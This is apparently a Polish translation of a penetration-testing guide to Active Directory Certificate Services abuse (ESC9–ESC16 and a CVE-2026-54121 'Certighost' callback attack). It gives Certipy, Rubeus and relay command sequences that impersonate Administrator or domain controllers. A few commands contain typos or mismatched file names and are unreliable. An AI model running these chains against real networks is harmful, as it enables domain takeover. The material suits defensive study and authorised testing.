#### Nadużycie za pomocą [Certipy](https://github.com/ly4k/Certipy)

Żądanie certyfikatu jest domyślnie wykonywane przez Certipy na podstawie template `Machine` lub `User`, zależnie od tego, czy nazwa konta poddawanego relay kończy się znakiem `$`. Wskazanie alternatywnego template można zrealizować za pomocą parametru `-template`.

Następnie można użyć techniki takiej jak [PetitPotam](https://github.com/ly4k/PetitPotam) w celu wymuszenia uwierzytelnienia. W przypadku kontrolerów domeny wymagane jest wskazanie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Brak rozszerzenia bezpieczeństwa - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, określana jako ESC9, zapobiega osadzaniu **nowego rozszerzenia bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`** w certyfikacie. Flaga ta ma znaczenie, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (ustawienie domyślne), w przeciwieństwie do wartości `2`. Jej znaczenie wzrasta w scenariuszach, w których można wykorzystać słabsze mapowanie certyfikatu dla Kerberos lub Schannel (jak w ESC10), ponieważ brak ESC9 nie zmieniałby wymagań.

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:

- `StrongCertificateBindingEnforcement` nie jest ustawione na `2` (wartość domyślna to `1`) lub `CertificateMappingMethods` zawiera flagę `UPN`.
- Certyfikat ma ustawioną flagę `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
- Certyfikat określa dowolne EKU uwierzytelniania klienta.
- Dostępne są uprawnienia `GenericWrite` do dowolnego konta, aby przejąć inne konto.

### Scenariusz wykorzystania

Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` do `Jane@corp.local`, a celem jest przejęcie `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego `Jane@corp.local` ma uprawnienia rejestracji, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.

Początkowo hash `Jane` zostaje pozyskany przy użyciu Shadow Credentials dzięki uprawnieniom `GenericWrite` posiadanym przez `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie atrybut `userPrincipalName` użytkownika `Jane` zostaje zmieniony na `Administrator`, celowo z pominięciem części domeny `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` pozostaje odrębną wartością `userPrincipalName` użytkownika `Administrator`.

Następnie podatny szablon certyfikatu `ESC9` zostaje zażądany jako `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że `userPrincipalName` certyfikatu odzwierciedla `Administrator`, bez żadnego „object SID”.

Następnie `userPrincipalName` użytkowniczki `Jane` zostaje przywrócony do pierwotnej wartości `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia za pomocą wystawionego certyfikatu zwraca teraz hash NT użytkownika `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` z powodu braku specyfikacji domeny w certyfikacie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Słabe mapowania certyfikatów - ESC10

### Wyjaśnienie

Dwie wartości kluczy rejestru na kontrolerze domeny są określane jako ESC10:

- Wartość domyślna dla `CertificateMappingMethods` w `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
- Domyślne ustawienie `StrongCertificateBindingEnforcement` w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.

**Przypadek 1**

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`.

**Przypadek 2**

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadek nadużycia 1

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do przejęcia dowolnego konta B.

Na przykład, mając uprawnienia `GenericWrite` do `Jane@corp.local`, atakujący chce przejąć `Administrator@corp.local`. Procedura jest podobna do ESC9, co pozwala na użycie dowolnego szablonu certyfikatu.

Najpierw hash konta `Jane` jest pobierany za pomocą Shadow Credentials, z wykorzystaniem uprawnień `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie wartość `userPrincipalName` użytkownika `Jane` zostaje zmieniona na `Administrator`, celowo z pominięciem części `@corp.local`, aby uniknąć naruszenia ograniczenia.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie jako `Jane` żądany jest certyfikat umożliwiający uwierzytelnianie klienta, z użyciem domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Wartość `userPrincipalName` użytkowniczki `Jane` zostaje następnie przywrócona do oryginalnej wartości `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Uwierzytelnienie za pomocą uzyskanego certyfikatu zwróci hash NT użytkownika `Administrator@corp.local`, co wymaga określenia domeny w poleceniu ze względu na brak informacji o domenie w certyfikacie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Przypadek nadużycia 2

Gdy `CertificateMappingMethods` zawiera flagę bitową `UPN` (`0x4`), konto A z uprawnieniami `GenericWrite` może przejąć dowolne konto B, któremu brakuje właściwości `userPrincipalName`, w tym konta komputerów oraz wbudowane konto administratora domeny `Administrator`.

Celem jest przejęcie `DC$@corp.local`, zaczynając od uzyskania hasha konta `Jane` za pomocą Shadow Credentials i wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` użytkownika `Jane` zostaje następnie ustawiony na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Certyfikat do uwierzytelniania klienta jest żądany jako `Jane` przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostaje przywrócony do pierwotnej wartości po tym procesie.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Do uwierzytelniania za pośrednictwem Schannel wykorzystuje się opcję `-ldap-shell` narzędzia Certipy, co wskazuje na pomyślne uwierzytelnienie jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Za pośrednictwem powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają przeprowadzanie ataków Resource-Based Constrained Delegation (RBCD), co potencjalnie pozwala na przejęcie kontrolera domeny.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta podatność obejmuje również każde konto użytkownika pozbawione `userPrincipalName` lub takie, w którym nie odpowiada on wartości `sAMAccountName`. Domyślne konto `Administrator@corp.local` jest głównym celem ze względu na podwyższone uprawnienia LDAP oraz domyślny brak `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Wyjaśnienie

Jeśli CA Server nie jest skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, możliwe jest przeprowadzanie ataków NTLM relay bez podpisywania za pośrednictwem usługi RPC. [Odnośnik tutaj](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Możesz użyć `certipy`, aby sprawdzić, czy opcja `Enforce Encryption for Requests` jest wyłączona. `certipy` wyświetli wtedy podatności `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenariusz nadużycia

Należy skonfigurować serwer relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Uwaga: W przypadku kontrolerów domeny musimy określić `-template` w DomainController.

Lub używając [forka impacket autorstwa sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować Certificate Authority tak, aby przechowywał swój klucz na zewnętrznym urządzeniu, takim jak "Yubico YubiHSM2".

Jeśli urządzenie USB jest podłączone do serwera CA przez port USB lub przez serwer urządzeń USB w przypadku, gdy serwer CA jest maszyną wirtualną, do generowania i używania kluczy w YubiHSM przez Key Storage Provider wymagany jest klucz uwierzytelniający (czasami określany jako "password").

Ten klucz/hasło jest przechowywane w rejestrze w lokalizacji `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci tekstu jawnego.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenariusz nadużycia

Jeśli klucz prywatny CA jest przechowywany na fizycznym urządzeniu USB, po uzyskaniu dostępu shell możliwe jest jego odzyskanie.

Najpierw należy uzyskać certyfikat CA (jest publiczny), a następnie:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na koniec użyj polecenia `certutil -sign`, aby sfałszować nowy, dowolny certyfikat przy użyciu certyfikatu CA i jego klucza prywatnego.

## OID Group Link Abuse - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` umożliwia dodanie policy issuance do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid`, odpowiedzialne za wydawanie policies, można znaleźć w Configuration Naming Context (`CN=OID,CN=Public Key Services,CN=Services`) kontenera PKI OID. Policy można połączyć z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, umożliwiając systemowi autoryzowanie użytkownika przedstawiającego certyfikat tak, jakby był członkiem tej grupy. [Odnośnik tutaj](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Innymi słowy, gdy użytkownik ma uprawnienia do enroll certificate, a certyfikat jest połączony z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), aby znaleźć OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenariusz nadużycia

Znajdź użytkownika posiadającego uprawnienia, używając `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienia do rejestrowania się w `VulnerableTemplate`, może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wystarczy określić szablon, aby otrzymać certyfikat z uprawnieniami OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Podatna konfiguracja odnawiania certyfikatów - ESC14

### Wyjaśnienie

Opis na stronie https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping jest niezwykle szczegółowy. Poniżej znajduje się cytat z oryginalnego tekstu.

ESC14 dotyczy podatności wynikających ze „słabego jawnego mapowania certyfikatów”, głównie poprzez niewłaściwe użycie lub niebezpieczną konfigurację atrybutu `altSecurityIdentities` na kontach użytkowników lub komputerów w Active Directory. Ten wielowartościowy atrybut umożliwia administratorom ręczne powiązanie certyfikatów X.509 z kontem AD na potrzeby uwierzytelniania. Po wypełnieniu te jawne mapowania mogą zastąpić domyślną logikę mapowania certyfikatów, która zwykle opiera się na nazwach UPN lub DNS w SAN certyfikatu albo na identyfikatorze SID zawartym w rozszerzeniu zabezpieczeń `szOID_NTDS_CA_SECURITY_EXT`.

„Słabe” mapowanie występuje, gdy wartość tekstowa używana w atrybucie `altSecurityIdentities` do identyfikacji certyfikatu jest zbyt ogólna, łatwa do odgadnięcia, opiera się na nieunikatowych polach certyfikatu lub wykorzystuje elementy certyfikatu, które łatwo sfałszować. Jeśli attacker może uzyskać lub utworzyć certyfikat, którego atrybuty pasują do tak słabo zdefiniowanego jawnego mapowania uprzywilejowanego konta, może użyć tego certyfikatu do uwierzytelnienia się jako to konto i jego impersonacji.

Przykłady potencjalnie słabych ciągów mapowania `altSecurityIdentities` obejmują:

- Mapowanie wyłącznie na podstawie typowej nazwy Common Name (CN) podmiotu: np. `X509:<S>CN=SomeUser`. Attacker może być w stanie uzyskać certyfikat z takim CN z mniej bezpiecznego źródła.
- Używanie zbyt ogólnych nazw wyróżniających (DN) wystawcy lub podmiotu bez dodatkowych kwalifikatorów, takich jak konkretny numer seryjny lub identyfikator klucza podmiotu: np. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Stosowanie innych przewidywalnych wzorców lub niekryptograficznych identyfikatorów, które attacker może być w stanie spełnić w certyfikacie, który może legalnie uzyskać lub sfałszować (jeśli przejął CA albo znalazł podatny template, taki jak w ESC1).

Atrybut `altSecurityIdentities` obsługuje różne formaty mapowania, takie jak:

- `X509:<I>IssuerDN<S>SubjectDN` (mapowanie na podstawie pełnych DN wystawcy i podmiotu)
- `X509:<SKI>SubjectKeyIdentifier` (mapowanie na podstawie wartości rozszerzenia Subject Key Identifier certyfikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapowanie na podstawie numeru seryjnego, niejawnie kwalifikowanego przez DN wystawcy) - nie jest to standardowy format, zwykle używa się `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapowanie na podstawie nazwy RFC822, zazwyczaj adresu e-mail, z SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapowanie na podstawie skrótu SHA1 surowego klucza publicznego certyfikatu - ogólnie silne)

Bezpieczeństwo tych mapowań w dużym stopniu zależy od szczegółowości, unikatowości i siły kryptograficznej wybranych identyfikatorów certyfikatu użytych w ciągu mapowania. Nawet przy włączonych na Domain Controllers silnych trybach wiązania certyfikatów (które dotyczą głównie niejawnych mapowań opartych na UPN/DNS w SAN oraz rozszerzeniu SID), nieprawidłowo skonfigurowany wpis `altSecurityIdentities` nadal może zapewniać bezpośrednią ścieżkę do impersonacji, jeśli sama logika mapowania jest wadliwa lub zbyt liberalna.
### Scenariusz nadużycia

ESC14 koncentruje się na **jawnych mapowaniach certyfikatów** w Active Directory (AD), a konkretnie na atrybucie `altSecurityIdentities`. Jeśli ten atrybut jest ustawiony (celowo lub w wyniku błędnej konfiguracji), attacker może dokonać impersonacji kont, przedstawiając certyfikaty pasujące do mapowania.

#### Scenariusz A: Attacker może zapisywać w `altSecurityIdentities`

**Warunek wstępny**: Attacker ma uprawnienia zapisu do atrybutu `altSecurityIdentities` konta docelowego lub uprawnienia do ich nadania w postaci jednego z poniższych uprawnień do docelowego obiektu AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenariusz B: Cel ma słabe mapowanie przez X509RFC822 (Email)

- **Warunek wstępny**: Cel ma słabe mapowanie X509RFC822 w `altSecurityIdentities`. Attacker może ustawić atrybut mail ofiary tak, aby pasował do nazwy X509RFC822 celu, zapisać certyfikat jako ofiara i użyć go do uwierzytelnienia się jako cel.
#### Scenariusz C: Cel ma mapowanie X509IssuerSubject

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509IssuerSubject w `altSecurityIdentities`. Attacker może ustawić atrybut `cn` lub `dNSHostName` na principalu ofiary tak, aby pasował do podmiotu mapowania X509IssuerSubject celu. Następnie attacker może zapisać certyfikat jako ofiara i użyć go do uwierzytelnienia się jako cel.
#### Scenariusz D: Cel ma mapowanie X509SubjectOnly

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509SubjectOnly w `altSecurityIdentities`. Attacker może ustawić atrybut `cn` lub `dNSHostName` na principalu ofiary tak, aby pasował do podmiotu mapowania X509SubjectOnly celu. Następnie attacker może zapisać certyfikat jako ofiara i użyć go do uwierzytelnienia się jako cel.
### konkretne operacje
#### Scenariusz A

Zażądaj certyfikatu z template certyfikatu `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zapisz i przekonwertuj certyfikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Uwierzytelnij się (używając certyfikatu)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Czyszczenie (opcjonalne)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
W przypadku bardziej szczegółowych metod ataku w różnych scenariuszach ataku zapoznaj się z: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Wyjaśnienie

Opis dostępny pod adresem https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc jest wyjątkowo szczegółowy. Poniżej znajduje się cytat z oryginalnego tekstu.

Korzystając z wbudowanych domyślnych szablonów certyfikatów w wersji 1, attacker może utworzyć CSR zawierający application policies, które mają pierwszeństwo przed skonfigurowanymi atrybutami Extended Key Usage określonymi w szablonie. Jedynym wymaganiem są uprawnienia do enrollment, a rozwiązanie to może służyć do generowania certyfikatów client authentication, certificate request agent oraz codesigning przy użyciu szablonu **_WebServer_**

### Wykorzystanie

Poniżej znajduje się odwołanie do [tego linku]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Kliknij, aby zobaczyć bardziej szczegółowe metody użycia.


Polecenie `find` programu Certipy może pomóc zidentyfikować szablony V1 potencjalnie podatne na ESC15, jeśli CA nie zostało załatane.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenariusz A: Direct Impersonation via Schannel

**Krok 1: Zażądaj certyfikatu, wstrzykując „Client Authentication” Application Policy oraz docelowy UPN.** Atakujący `attacker@corp.local` obiera za cel `administrator@corp.local`, używając szablonu „WebServer” V1 (który umożliwia podanie subject przez enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Podatny szablon V1 z opcją „Enrollee supplies subject”.
- `-application-policies 'Client Authentication'`: Wstrzykuje OID `1.3.6.1.5.5.7.3.2` do rozszerzenia Application Policies żądania CSR.
- `-upn 'administrator@corp.local'`: Ustawia UPN w SAN w celu impersonacji.

**Step 2: Uwierzytelnij się za pośrednictwem Schannel (LDAPS), używając uzyskanego certyfikatu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenariusz B: Impersonacja PKINIT/Kerberos przez nadużycie Enrollment Agent

**Krok 1: Zażądaj certyfikatu z szablonu V1 (z opcją „Enrollee supplies subject”), wstrzykując Application Policy „Certificate Request Agent”.** Ten certyfikat jest przeznaczony dla atakującego (`attacker@corp.local`), aby mógł stać się Enrollment Agent. W tym miejscu nie określa się UPN dla własnej tożsamości atakującego, ponieważ celem jest uzyskanie możliwości działania jako agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Wstrzykuje OID `1.3.6.1.4.1.311.20.2.1`.

**Krok 2: Użyj certyfikatu „agenta”, aby zażądać certyfikatu w imieniu docelowego uprzywilejowanego użytkownika.** Jest to krok podobny do ESC3, wykorzystujący certyfikat z Kroku 1 jako certyfikat agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Krok 3: Uwierzytelnij się jako uprzywilejowany użytkownik, używając certyfikatu „on-behalf-of”.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Rozszerzenie zabezpieczeń wyłączone na CA (globalnie)-ESC16

### Wyjaśnienie

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi się do sytuacji, w której konfiguracja AD CS nie wymusza dołączania rozszerzenia **szOID_NTDS_CA_SECURITY_EXT** do wszystkich certyfikatów, co atakujący może wykorzystać poprzez:

1. Zażądanie certyfikatu **bez powiązania z SID**.

2. Użycie tego certyfikatu do uwierzytelnienia jako dowolne konto, na przykład podszywając się pod konto o wysokich uprawnieniach (np. Domain Administrator).

Możesz również zapoznać się z [tym artykułem](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6), aby dowiedzieć się więcej o szczegółowych zasadach.

### Wykorzystanie

Poniżej znajduje się odwołanie do [tego linku](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Kliknij, aby zobaczyć bardziej szczegółowe metody użycia.

Aby ustalić, czy środowisko Active Directory Certificate Services (AD CS) jest podatne na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Krok 1: Odczytaj początkowy UPN konta ofiary (opcjonalnie — do przywrócenia).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Krok 2: Zaktualizuj UPN konta ofiary do wartości `sAMAccountName` docelowego administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Krok 3: (W razie potrzeby) Uzyskaj dane uwierzytelniające dla konta „ofiary” (np. za pomocą Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Krok 4: Zażądaj certyfikatu jako użytkownik _„ofiara”_ z _dowolnego odpowiedniego szablonu uwierzytelniania klienta_ (np. „User”) na urzędzie certyfikacji podatnym na ESC16.** Ponieważ urząd certyfikacji jest podatny na ESC16, automatycznie pominie rozszerzenie zabezpieczeń SID w wydanym certyfikacie, niezależnie od konkretnych ustawień tego rozszerzenia w szablonie. Ustaw zmienną środowiskową pamięci podręcznej poświadczeń Kerberos (polecenie powłoki):
```bash
export KRB5CCNAME=victim.ccache
```
Następnie zażądaj certyfikatu:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Krok 5: Przywróć UPN konta „victim”.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Krok 6: Uwierzytelnij się jako administrator docelowy.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Podstawienie tożsamości w callbacku Rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Wyjaśnienie

**Certighost** wykorzystuje **ścieżkę AD CS enrollment chase / callback**, w której CA ufa atrybutom żądania dostarczonym przez requestera podczas ustalania tożsamości, która powinna zostać umieszczona w wystawionym certyfikacie. W publicznym PoC spreparowane żądanie zawiera:

- **`cdc`**: kontrolowany przez atakującego host/IP, z którym CA nawiąże połączenie
- **`rmd`**: nazwa DNS docelowego Domain Controller, którego tożsamość ma zostać podszyta

Jeśli CA wykona ten chase, połączy się z atakującym przez **SMB/LSA (`445`)** oraz **LDAP (`389`)**. Atakujący używa **prawdziwego konta komputera** (zwykle utworzonego za pomocą domyślnej wartości **`ms-DS-MachineAccountQuota`**), aby sesja callback uwierzytelniła się jako prawidłowy principal domeny, ale rogue services zwracają zamiast tego atrybuty tożsamości **docelowego DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Jeśli CA **nie powiąże kryptograficznie zwróconej tożsamości z uwierzytelnionym principalem callback**, może wystawić certyfikat dla **Domain Controller**, mimo że sesja została uwierzytelniona jako kontrolowane przez atakującego konto komputera. To sprawia, że błąd różni się koncepcyjnie od **Certifried**: zamiast modyfikować atrybuty AD, takie jak `dNSHostName`, atakujący **podstawia dane tożsamości podczas rozwiązywania callbacku CA**.

**Przydatne warunki wstępne:**

- Niskie uprawnienia oraz **credentials domeny**
- Możliwość **utworzenia lub ponownego użycia konta komputera**
- Dostępność sieciowa z **CA** do kontrolowanych przez atakującego **portów `389` i `445`**
- Podatna / niezałatana ścieżka obsługi żądań CA (aktualizacja Microsoft z **14 lipca 2026 r.** dodała **walidację DC dla `cdc`** oraz **porównanie resolved-SID**)

Wynikowy **`.pfx`** może następnie zostać użyty do **PKINIT**, co prowadzi do uzyskania **`.ccache`** oraz, w opublikowanym przepływie PoC, **hasha NT docelowego DC**, co zazwyczaj wystarcza do **pełnego przejęcia domeny**.

### Wykorzystanie

Publiczny PoC automatyzuje cały łańcuch:

1. Utworzenie lub ponowne użycie kontrolowanego przez atakującego **konta komputera**.
2. Uruchomienie **rogue LDAP i SMB/LSA listeners** na portach `389` i `445`.
3. Przesłanie żądania certyfikatu zawierającego kontrolowane przez atakującego atrybuty **`cdc`** i docelowy **`rmd`**.
4. Umożliwienie CA uwierzytelnienia się do rogue listeners jako kontrolowane konto komputera, a następnie udzielenie odpowiedzi na zapytania o tożsamość atrybutami **docelowego DC**.
5. Otrzymanie podpisanego przez CA **certyfikatu DC**, a następnie użycie go do **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Przydatne flags runtime z PoC:

- `--listener <ip>`: jawny wybór callback IP reklamowanego w `cdc`
- `--computer-name <NAME$>`: ponowne użycie istniejącego machine account zamiast tworzenia nowego

**Uwagi operacyjne:**

- PoC wymaga **root**, ponieważ wiąże się z **uprzywilejowanymi portami** `389` i `445`.
- Pomyślna eksploatacja zapisuje lokalnie **DC `.pfx`** oraz **Kerberos `.ccache`**.
- Ponieważ certyfikat jest mapowany na konto **Domain Controller**, dalsze działania mogą obejmować **certificate-based Kerberos auth**, **DCSync** oraz ponowne wykorzystanie odzyskanego **machine NT hash**.

